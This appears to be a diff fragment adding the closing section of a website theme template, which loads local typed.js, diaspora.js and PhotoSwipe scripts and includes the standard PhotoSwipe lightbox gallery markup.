+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
